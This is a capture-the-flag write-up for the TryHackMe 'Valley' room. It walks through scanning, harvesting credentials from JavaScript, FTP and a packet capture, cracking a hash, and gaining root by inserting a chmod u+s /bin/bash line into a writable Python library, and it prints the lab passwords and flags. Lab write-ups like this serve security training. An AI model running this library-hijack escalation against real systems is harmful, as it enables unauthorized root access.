## Valley - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/valleype)

**IP: 10.10.166.26**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, Wireshark<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting of with Nmap scan and Gobuster fuzzing.

  ```
  nmap -sC -sV 10.10.166.26

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
  |   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
  |_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Site doesn't have a title (text/html).
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.166.26/ -w /usr/share/wordlists/dirb/common.txt
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /gallery              (Status: 301) [Size: 314] [--> http://10.10.166.26/gallery/]
  /index.html           (Status: 200) [Size: 1163]
  /pricing              (Status: 301) [Size: 314] [--> http://10.10.166.26/pricing/]
  /server-status        (Status: 403) [Size: 277]
  /static               (Status: 301) [Size: 313] [--> http://10.10.166.26/static/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  
  gobuster dir -u http://10.10.166.26/static -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /11                   (Status: 200) [Size: 627909]
  /3                    (Status: 200) [Size: 421858]
  /10                   (Status: 200) [Size: 2275927]
  /12                   (Status: 200) [Size: 2203486]
  /5                    (Status: 200) [Size: 1426557]
  /1                    (Status: 200) [Size: 2473315]
  /15                   (Status: 200) [Size: 3477315]
  /17                   (Status: 200) [Size: 3551807]
  /2                    (Status: 200) [Size: 3627113]
  /9                    (Status: 200) [Size: 1190575]
  /6                    (Status: 200) [Size: 2115495]
  /16                   (Status: 200) [Size: 2468462]
  /14                   (Status: 200) [Size: 3838999]
  /18                   (Status: 200) [Size: 2036137]
  /7                    (Status: 200) [Size: 5217844]
  /13                   (Status: 200) [Size: 3673497]
  /8                    (Status: 200) [Size: 7919631]
  /4                    (Status: 200) [Size: 7389635]
  /00                   (Status: 200) [Size: 127]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When you visit `http://10.10.166.26/static/00` you will see a note.

  ```
  dev notes from valleyDev:
  -add wedding photo examples
  -redo the editing on #4
  -remove /dev1243224123123
  -check for SIEM alerts
  ```
  
- `http://10.10.166.26/dev1243224123123/` is a login page. In .js file you can find credentials.

  ```
  const loginForm = document.getElementById("login-form");
  const loginButton = document.getElementById("login-form-submit");
  const loginErrorMsg = document.getElementById("login-error-msg");
  
  loginForm.style.border = '2px solid #ccc';
  loginForm.style.padding = '20px';
  loginButton.style.backgroundColor = '#007bff';
  loginButton.style.border = 'none';
  loginButton.style.borderRadius = '5px';
  loginButton.style.color = '#fff';
  loginButton.style.cursor = 'pointer';
  loginButton.style.padding = '10px';
  loginButton.style.marginTop = '10px';
  
  
  function isValidUsername(username) {
  
  	if(username.length < 5) {
  
  	console.log("Username is valid");
  
  	}
  	else {
  
  	console.log("Invalid Username");
  
  	}
  
  }
  
  function isValidPassword(password) {
  
  	if(password.length < 7) {
  
          console.log("Password is valid");
  
          }
          else {
  
          console.log("Invalid Password");
  
          }
  
  }
  
  function showErrorMessage(element, message) {
    const error = element.parentElement.querySelector('.error');
    error.textContent = message;
    error.style.display = 'block';
  }
  
  loginButton.addEventListener("click", (e) => {
      e.preventDefault();
      const username = loginForm.username.value;
      const password = loginForm.password.value;
  
      if (username === "siemDev" && password === "california") {
          window.location.href = "/dev1243224123123/devNotes37370.txt";
      } else {
          loginErrorMsg.style.opacity = 1;
      }
  })
  ```

- Login with newly found credentials and you will see another note.

  ```
  dev notes for ftp server:
  -stop reusing credentials
  -check for any vulnerabilies
  -stay up to date on patching
  -change ftp port to normal port
  ```

- Now use the same credentials to login with FTP.

  ```
  nmap -sV -p- 10.10.166.26

  PORT      STATE SERVICE VERSION
  22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
  37370/tcp open  ftp     vsftpd 3.0.3
  Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

  ftp 10.10.166.26 37370

  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  ftp> ls -al
  229 Entering Extended Passive Mode (|||38169|)
  150 Here comes the directory listing.
  dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 .
  dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 ..
  -rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
  -rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
  -rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
  226 Directory send OK.
  ftp> get siemFTP.pcapng
  local: siemFTP.pcapng remote: siemFTP.pcapng
  229 Entering Extended Passive Mode (|||22803|)
  150 Opening BINARY mode data connection for siemFTP.pcapng (7272 bytes).
  100% |************************************************************************|  7272      100.14 KiB/s    00:00 ETA
  226 Transfer complete.
  7272 bytes received in 00:00 (60.91 KiB/s)
  ftp> get siem
  siemFTP.pcapng          siemHTTP1.pcapng        siemHTTP2.pcapng
  ftp> get siemHTTP1.pcapng
  local: siemHTTP1.pcapng remote: siemHTTP1.pcapng
  229 Entering Extended Passive Mode (|||47370|)
  150 Opening BINARY mode data connection for siemHTTP1.pcapng (1978716 bytes).
  100% |************************************************************************|  1932 KiB  899.34 KiB/s    00:00 ETA
  226 Transfer complete.
  1978716 bytes received in 00:02 (815.11 KiB/s)
  ftp> get siemHTTP2.pcapng
  local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
  229 Entering Extended Passive Mode (|||11664|)
  150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
  100% |************************************************************************|  1926 KiB  901.67 KiB/s    00:00 ETA
  226 Transfer complete.
  1972448 bytes received in 00:02 (879.54 KiB/s)
  ftp> exit
  221 Goodbye.
  ```

- Long story short, theres nothing in first 2 .pcap files but in `HTTP2` file you can find SSH credentials.

  ```
  2335	43.880057790	192.168.111.136	192.168.111.136	HTTP	605	POST /index.html HTTP/1.1  (application/x-www-form-urlencoded)

  POST /index.html HTTP/1.1
  Host: 192.168.111.136
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 42
  Origin: http://192.168.111.136
  Connection: keep-alive
  Referer: http://192.168.111.136/index.html
  Upgrade-Insecure-Requests: 1
  
  uname=valleyDev&psw=ph0t0s1234&remember=on
  HTTP/1.1 200 OK
  Date: Mon, 06 Mar 2023 21:05:08 GMT
  Server: Apache/2.4.55 (Debian)
  Last-Modified: Mon, 06 Mar 2023 20:46:17 GMT
  ETag: "2fc-5f64162f52399-gzip"
  Accept-Ranges: bytes
  Vary: Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 369
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/html
  ```

---

## 🧍 User Privilege Escalation

- First flag is already there. Moving to root now.

  ```
  valleyDev@valley:~$ whoami
  valleyDev
  
  valleyDev@valley:~$ id
  uid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev)
  
  valleyDev@valley:~$ ls -al
  total 24
  drwxr-xr-x 5 valleyDev valleyDev 4096 Mar 13  2023 .
  drwxr-xr-x 5 root      root      4096 Mar  6  2023 ..
  -rw-r--r-- 1 root      root         0 Mar 13  2023 .bash_history
  drwx------ 3 valleyDev valleyDev 4096 Mar 20  2023 .cache
  drwx------ 4 valleyDev valleyDev 4096 Mar  6  2023 .config
  drwxr-xr-x 3 valleyDev valleyDev 4096 Mar  6  2023 .local
  -rw-rw-rw- 1 root      root        24 Mar 13  2023 user.txt
  
  valleyDev@valley:~$ cat user.txt 
  THM{k@l1_1n_th3_v@lley}
  ```

---

## 👑 Root Privilege Escalation

- Here, I also found a auhenticator script and downloaded it to my Kali.

  ```
  valleyDev@valley:/home$ ls -al
  total 752
  drwxr-xr-x  5 root      root        4096 Mar  6  2023 .
  drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
  drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
  drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
  -rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
  drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
  ```
  
- Since it's a binary, I did strings on it and saved output then used mousepad to get a password.

  ```
  $ strings valleyAuthenticator > result.txt
  $ mousepad result.txt
  
  LINES: 6439 - 6452
  
  ?ATs
  -^;x&
  e6722920bab2326f8217e4
  bf6b1b58ac
  ddJ1cc76ee3
  beb60709056cfbOW
  elcome to Valley Inc. Authentica
  [k0rHh
   is your usernad
  Ol: /passwXd.{
  ~{edJrong P= 
  sL_striF::_M_M
  v0ida%02xo
  ~ c-74
  ```
  
- After cracking all of these hashes I found a password: `e6722920bab2326f8217e4 -> MD5 -> liberty123`. Switch to user `valley` with our new password.

  ```
  valleyDev@valley:/home$ su valley
  Password: 
  valley@valley:/home$ whoami
  valley
  valley@valley:/home$ id
  uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
  ```

- You can see that this user is in the group `valleyAdmin` so let's enumerate it.

  ```
  valley@valley:~$ find / -type f -group valleyAdmin 2>/dev/null
  /usr/lib/python3.8/base64.py
  ```

- Cool, we can edit `base64` Python library. Edit the library by adding `import os; os.system("chmod u+s /bin/bash")`, wait a bit and then run `/bin/bash -p`. After it you can read the flag as root.

  ```
  valley@valley:~$ nano /usr/lib/python3.8/base64.py


  import os
  
  os.system("chmod u+s /bin/bash")
  
  valley@valley:~$ ls -al /bin/bash
  -rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
  
  valley@valley:~$ /bin/bash -p
  bash-5.0# whoami
  root
  bash-5.0# id
  uid=1000(valley) gid=1000(valley) euid=0(root) groups=1000(valley),1003(valleyAdmin)
  bash-5.0# cat /root/root.txt
  THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
  ```

---

## 🏁 Flags

- **User Flag**: `THM{k@l1_1n_th3_v@lley}`
- **Root Flag**: `THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much.`

- What did I learn?
  `New exploitation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
